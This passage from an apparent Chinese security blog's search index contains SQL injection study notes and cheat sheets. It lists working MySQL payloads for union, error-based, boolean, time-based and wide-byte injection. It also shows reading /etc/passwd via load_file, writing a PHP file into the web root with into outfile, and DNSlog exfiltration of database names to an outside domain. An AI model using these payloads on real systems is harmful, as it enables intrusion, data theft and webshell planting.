x)y)<br></code></pre></td></tr></table></figure><p>查询表和字段直接把联合注入的payload放进去就可以了</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(*),concat(concat((payload),<span class="hljs-number">0x7e</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)y)<br></code></pre></td></tr></table></figure><h6 id="ExtractValue报错"><a href="#ExtractValue报错" class="headerlink" title="ExtractValue报错"></a>ExtractValue报错</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">and</span> <span class="hljs-selector-tag">extractvalue</span>(<span class="hljs-number">1</span>, (<span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(payload),<span class="hljs-number">0</span>x7e))<br><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">extractvalue</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">concat</span>(<span class="hljs-number">0</span>x7e,(select <span class="hljs-variable">@@version</span>),<span class="hljs-number">0</span>x7e))<br></code></pre></td></tr></table></figure><h6 id="UpdateXML报错"><a href="#UpdateXML报错" class="headerlink" title="UpdateXML报错"></a>UpdateXML报错</h6><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and updatexml(<span class="hljs-number">1</span>,(<span class="hljs-name">payload</span>),<span class="hljs-number">1</span>)<br><br>and updatexml(<span class="hljs-number">1</span>, (<span class="hljs-name">concat</span>(<span class="hljs-number">0</span>x7e,(<span class="hljs-name">select</span> user()),<span class="hljs-number">0</span>x7e)),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="三-布尔注入"><a href="#三-布尔注入" class="headerlink" title="三 .布尔注入 :"></a>三 .布尔注入 :</h3><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">and (<span class="hljs-name">select</span> ascii(<span class="hljs-name">substr</span>((<span class="hljs-name">payload</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)))&gt;105 <br></code></pre></td></tr></table></figure><h3 id="四-时间注入"><a href="#四-时间注入" class="headerlink" title="四 . 时间注入 :"></a>四 . 时间注入 :</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">if</span>(ascii(substr((payload), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>))=<span class="hljs-number">114</span>, sleep(<span class="hljs-number">5</span>), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="五-宽字节注入"><a href="#五-宽字节注入" class="headerlink" title="五 .宽字节注入"></a>五 .宽字节注入</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cos">GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际为<span class="hljs-number">2</span>字节<br><br>如果使用了类似于<span class="hljs-keyword">set</span> names gbk这样得语句,此时mysql数据库就会将<br><br><span class="hljs-keyword">Ascii</span>大于<span class="hljs-number">128</span>(<span class="hljs-built_in">%df</span>)得字符当作是汉字字符得一部分,从而能吃掉\,引入单引号或者双引号<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>sql注入备忘录</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql总结</title>
    <link href="/2021/01/24/sql1/"/>
    <url>/2021/01/24/sql1/</url>
    
    <content type="html"><![CDATA[<h4 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h4><h6 id="一-根据sql数据类型分类"><a href="#一-根据sql数据类型分类" class="headerlink" title="一.根据sql数据类型分类"></a>一.根据sql数据类型分类</h6><p>加单引号,报错可能有注入,不报错没有注入</p><p>1.整形注入(不需要闭合,注释)</p><p>2.字符串类型注入(需要闭合,注释)</p><h6 id><a href="#" class="headerlink" title></a></h6><h6 id="二-判断sql注入是整形还是字符串"><a href="#二-判断sql注入是整形还是字符串" class="headerlink" title="二.判断sql注入是整形还是字符串"></a>二.<strong>判断</strong>sql注入是整形还是字符串</h6><p>①.<strong>1a和1也可以判断整形和字符串类型如果是字符串就会没什么区别,要是整形会出现1a报错,1正常显示</strong>(如果有init()整形转化函数,就gg)</p><p>②.and 1&#x3D;1 &#x2F;and1&#x3D;2 回显页面不同(真假判断) (waf拦截) ture or false</p><h6 id="三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同"><a href="#三-引号判断-单引号判断或者双引号-显示数据库错误信息或者页面回显不同" class="headerlink" title="三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同"></a><strong>三.引号判断(单引号判断或者双引号) 显示数据库错误信息或者页面回显不同</strong></h6><p>①.(\转义符) 无论整形或者字符串都会报错,只能通过报错信息判断</p><p>②.-1&#x2F;+1通过加减法是否成功(一般用的减法,因为+在一定意义上也代表空格)</p><p>③.and sleep() 通过是否睡眠判断该函数是否执行进而判断是否为字符型还是整形,睡眠成功&#x3D;整形,否者为字符串</p><p>注意:在实战中不能随意根据这些固定的方法去判断这是什么类型,因为我们并不知道它们在后端做了什么过滤,要谨慎下结论</p><h6 id="四-根据注入的类型分类"><a href="#四-根据注入的类型分类" class="headerlink" title="四.根据注入的类型分类"></a>四.根据注入的类型分类</h6><p>1.联合注入查询</p><p>2.报错注入</p><p>3.布尔注入</p><p>4.时间延时注入</p><p>5.宽字节注入</p><p>6二次注入(5,6用于有转义函数的时候addslashes()?)</p><p>7.堆叠注入 多语句查询 后端代码需要有多语句查询语句 5.0以下的版本 </p><p>8.偏移注入(只对access数据库有用,并且在实战中access数据库很少见)</p><p>9.DNS外带注入(这不算是一种类型吧,只是用于注入时比较慢或者不回显的注入 延时,布尔)</p><h6 id="五-mysql中三种注释风格"><a href="#五-mysql中三种注释风格" class="headerlink" title="五.mysql中三种注释风格"></a>五.mysql中三种注释风格</h6><p>1.url 编码为%23 #</p><p>2.– (后面有一个空格)</p><p>3.&#x2F;*….*&#x2F;</p><p>4.&#x2F;*!…*&#x2F;内联注释</p><p>5.&#x2F;*!*&#x2F;本身没有什么意义,只是干扰,select &#x2F;*!@@version&#x2F;</p><p>6.select * &#x2F;*!22222from*&#x2F; users;</p><p>如果当前的数字大于当前的版本则会被注释掉</p><p>否则失效,绕waf</p><h6 id="六-mysql函数利用-可用大小写等绕过waf"><a href="#六-mysql函数利用-可用大小写等绕过waf" class="headerlink" title="六.mysql函数利用,可用大小写等绕过waf"></a>六.mysql函数利用,可用大小写等绕过waf</h6><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs autoit">-- <span class="hljs-keyword">select</span> user()         root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> system_user()   root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> current_user()      root<span class="hljs-symbol">@localhost</span>(user都是当前用户)<br>-- <span class="hljs-keyword">select</span> session_user()<br>-- root<span class="hljs-symbol">@localhost</span><br>-- <span class="hljs-keyword">select</span> database() pikachu<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> version() <span class="hljs-number">5.7</span><span class="hljs-number">.26</span><br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@basedir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\(mysql安装路径)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@datadir</span> C:\phpstudy_pro\Extensions\MySQL5<span class="hljs-number">.7</span><span class="hljs-number">.26</span>\data(MySQL 数据库文件路径,当@<span class="hljs-symbol">@basedir</span>可用)<br>-- <span class="hljs-keyword">select</span> @<span class="hljs-symbol">@version_compile_os</span>    Win64<br></code></pre></td></tr></table></figure><h6 id="七-load-file-读文件操作-任意文件读取"><a href="#七-load-file-读文件操作-任意文件读取" class="headerlink" title="七.load_file() 读文件操作(任意文件读取)"></a>七.<strong>load_file() 读文件操作(任意文件读取)</strong></h6><p>注意:先看看secure_file_priv **show variables like ‘%secure_file_priv%’**是否开启.5.0以上版本默认关闭即使值为null ,为空没有任何东西才会允许load_file,还有写文件</p><p><strong>前提:</strong></p><p><strong>1.知道文件绝对路径</strong></p><p><strong>2.对web目录具有读写权限(基本上只有root权限才有读写权限)</strong></p><p><strong>3.全局gpc函数关闭</strong></p><p>4.**secure_file_priv **为空</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(&#x27;etc/passwd&#x27;),<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><br><span class="hljs-attribute">union</span> select <span class="hljs-number">1</span>,load_file(十六进制),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> 绕过过滤单双引号的限制<br></code></pre></td></tr></table></figure><p>所写的内容+into outfile + ‘保存的文件路径’<strong>写文件操作</strong>(5.3版本之前,会被gpc过滤单双引号,就没办法进行写入文件)</p><p><strong>例如:</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span> <span class="hljs-keyword">into</span> outFILE <span class="hljs-string">&#x27;../../../www/5.php&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://www.sql.com:<span class="hljs-number">8080</span>/Less-<span class="hljs-number">1</span>/?id=-<span class="hljs-number">1</span>%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>union%<span class="hljs-number">20</span>select%<span class="hljs-number">201</span>,<span class="hljs-number">0</span>x3c3f70687020706870696e666f28293b3f3e,<span class="hljs-number">3</span> into outFILE &#x27;../../../www/<span class="hljs-number">5</span>.php&#x27; --+<br></code></pre></td></tr></table></figure><p>最后一个显示位不能删掉,不然会报错.</p><p>前提:</p><p><strong>1.知道绝对路径</strong></p><p>2.用户必须有写文件权限 secure_file_priv</p><p>3.对web目录具有读写权限(基本上只有root权限才有读写权限)</p><p><strong>4.get_magic_gpc函数关闭,不然会目录写不进去</strong></p><p><strong>在数据库中into outfile语句把表数据导出到一个文本文件中,那么利用这个语句，再配合满足的‘三个条件’，即可实现文件或者一句话木马导入到数据库文件的目录中。 三个条件： 1.具有root权限。 2.在数据库配置文件中的 配置项含有：secure_file_priv&#x3D;’’。</strong></p><h6 id="八-mysql中union规则"><a href="#八-mysql中union规则" class="headerlink" title="八.  mysql中union规则"></a>八.  mysql中union规则</h6><p>1.union必须由两条或两条以上的select语句组成,语句之间要用关键字union分割</p><p>2.union中的每个查询必须包含相同的列数(字段)</p><p>3.union会从查询结果集中自动去除重复行</p><p>4.只有最后一个select允许有order by</p><p>5.只有最后一个select允许有limit</p><h6 id="-1"><a href="#-1" class="headerlink" title></a></h6><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>1.利用前提:页面上有显示位</p><p>2.优点:方便,快捷,易于利用</p><p>3.缺点:需要显示位</p><p>one:   order by 判断字段数 </p><h6 id="各种操作"><a href="#各种操作" class="headerlink" title="各种操作"></a>各种操作</h6><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> shcema_name <span class="hljs-keyword">from</span> infromation_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span> ) <span class="hljs-keyword">from</span> information_shcema.schemata(元数据库得数据库表) 一次性全部显示<br></code></pre></td></tr></table></figure><h6 id="列出对应得数据库得所有表"><a href="#列出对应得数据库得所有表" class="headerlink" title="列出对应得数据库得所有表"></a>列出对应得数据库得所有表</h6><p>limit一个个打印出来字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">select <span class="hljs-built_in">group_concat</span>(table_name)frominformation_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-number">0</span>x674657374 <br><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">()</span></span>一次性弄出来<br></code></pre></td></tr></table></figure><p><strong>注意数据库名可以使用十六进制来替代字符串,这样可以绕过单引号得限制</strong> </p><h6 id="查询特定的表的字段"><a href="#查询特定的表的字段" class="headerlink" title="查询特定的表的字段"></a>查询特定的表的字段</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="-2"><a href="#-2" class="headerlink" title></a></h5>]]></content>
    
    
    <categories>
      
      <category>sql总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql各种注入手法</title>
    <link href="/2021/01/23/sql/"/>
    <url>/2021/01/23/sql/</url>
    
    <content type="html"><![CDATA[<h5 id="一-报错注入"><a href="#一-报错注入" class="headerlink" title="一.报错注入"></a>一.报错注入</h5><p>利用前提:页面上没有显示位无所谓,但是需要输出sql语句执行错误信息,比如mysqli_error()</p><p>优点:不需要显示位</p><p>缺点:需要输出mysqli_error()报错信息</p><h5 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h5><p><strong>1.Floor() 对于这个报错来说,先group by 之后再select</strong></p><p>group by 执行一次rand ,如果有,直接count(*),如果没有,先插入(相当于执行力两次rand)</p><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整,只保留整数部分</p><p>rand(0)函数可以用来生成0,1,但是rand(0)和rand()还是有本质去别的,rand(0)相当于给rand函数传递了一个参数,然后rand()函数会根据0这个参数进行随机数生成.而rand()生成的数字是完全随机的,而rand(0)是有规律的生成,我们可以在数据库中尝试.</p><p>floor()返回小于等于该值的最大整数.</p><p>mt_rand()比rand()获取随机数更快</p><p><strong>2.通过extractvalue报错</strong></p><p>函数解释:</p><p>extractvalue():从目标xml中返回包含所查询的字符串.</p><p>extractvalue(xml_document,XPath_string);</p><p>第一个参数:xml_document是string格式(如果我们不写字符串格式而写一个数字,那么就会报错,将第二个参数后面的语句查询出来.concat(1(只要是不正确的路径就行),….),输入不正确的路径string,会直接报错输出)</p><p>第二个参数:XPAth_String(XPath格式的字符串)</p><p>and extractvaue(1,concat((任意字符),(payload),(任意字符串,可写可不写))</p><p><strong>如果XPath_string不是XPath格式,则会报错并显示出XPath_string的值</strong>,发生错误字符后面的值显示</p><p><strong>3.通过updatexml报错</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(pyload),<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(concatenate(<span class="hljs-number">1</span>,(select user()),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>4.exp函数报错,有版本限制5.7.26以下才可以用</p><h6 id="二-布尔注入"><a href="#二-布尔注入" class="headerlink" title="二.布尔注入"></a>二.布尔注入</h6><p>利用前提:页面上没有显示位,也没有输出sql语句执行错误信息.</p><p>只能通过页面返回正常不正常</p><p>优点:不需要显示位,不需要出错信息.</p><p>缺点速度慢,耗费大量时间(可写python脚本跑)</p><p><strong>布尔注入函数</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;Dumb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> ord(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> mid(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">right</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> ASCII(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username regexp (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br></code></pre></td></tr></table></figure><h6 id="三-延时注入"><a href="#三-延时注入" class="headerlink" title="三.延时注入"></a>三.延时注入</h6><p>利用前提:</p><p>页面上没有显示位,也没有输出SQL语句执行错误信息.</p><p>正确的sql语句和错误的sql语句返回页都一样,但是加入sleep(5)条件之后,页面明显加载时间有变化,慢了五秒</p><p>优点: 不需要显示位不需要错误信息</p><p>缺点:很明显速度慢,耗费大量的时间.</p><h6 id="四-宽字节注入"><a href="#四-宽字节注入" class="headerlink" title="四.宽字节注入"></a>四.宽字节注入</h6><p>GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际上为两字节,如果使用了类似于set names gbk这样的语句,此时的mysql数据库就会将ascii大于128(%df)的字符当作是汉字字符的一部分,从而能吃掉,引入单引号或者双引号.</p><h6 id="五-二次注入"><a href="#五-二次注入" class="headerlink" title="五.二次注入"></a>五.二次注入</h6><p>在注册中,注册一个和admin账号相似的admin’#,然后会发现你登陆admin’#的时候,实际上是登录了admin,改密码的时候,改的也是admin.当apache给数据库处理端传送SELECT * FROM users WHERE username&#x3D;’admin\‘#’ and password&#x3D;’$password’的时候,数据库此时会忽视\变成SELECT * FROM users WHERE username&#x3D;’admin’#’ and password&#x3D;’$password’ 后面的那段就被注释掉了</p><p>虽然登录的时候显示admin’#,但是数据库取出来的数据都是admin的</p><p>二次注入的利用条件:</p><p>1.用户向数据库插入恶意语句(即使后端代码对语句进行转义,如mysql_escape_string,mysql_real_escape_string转义)</p><p>2.数据库对直接取出来的恶意数据并没有进行过滤</p><h6 id="六-DNSLOG外带注入"><a href="#六-DNSLOG外带注入" class="headerlink" title="六.DNSLOG外带注入"></a>六.DNSLOG外带注入</h6><p>条件:</p><p>需要load_file(读权限),需要开启security_file_priv为空</p><p>不论是布尔盲注还是时间注入,都需要频繁的跑请求才能获取数据库中的值,在现代的waf防护下,很可能导致ip被封,我们可以结合dnslog完美快速的将数据取出来.如遇到mysql盲注时,可以利用内置函数load_file()来完成dnslog外带注入,load_file不仅能够加载本地文件,同时也能对url发起请求</p><p>网址:<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> load_file(<span class="hljs-built_in">concat</span>(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.xxx. dnslog.cn\\\abc&#x27;))--+<br></code></pre></td></tr></table></figure><p>注意像这个dnslog外带,对应于@等特殊字符读不出来,需要加编码变成数字</p><p>尽量用十六进制函数包裹,以防对方数据具有特殊字符</p><p>\1. sql盲注，后端数据库用的mysql数据库，<strong>说一下用dnslog回显只能用于windows系统</strong>，原理就是’\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</p><p>\2. 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p><blockquote><p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为C:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>通过设置my.ini来配置。secure_file_priv&#x3D;””就是可以load_flie任意磁盘的文件。</p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
